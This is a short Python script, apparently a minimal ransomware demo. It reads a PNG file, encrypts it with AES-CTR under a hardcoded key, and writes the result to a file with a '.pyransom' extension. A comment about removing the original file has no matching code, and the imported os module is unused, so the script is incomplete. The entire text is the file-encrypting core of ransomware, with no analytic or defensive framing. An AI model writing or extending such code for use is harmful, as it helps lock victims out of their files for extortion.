import pyaes
import os

# FILE
filename = "image1.png"
KEY = b"0123456789123456"

with open(filename, "rb") as file:
    content = file.read()

# REMOVE FILENAME
crypto_data = pyaes.AESModeOfOperationCTR(KEY).encrypt(content)

new_filename = "{}.pyransom".format(filename)
with open(new_filename, "wb") as file:
    file.write(crypto_data)
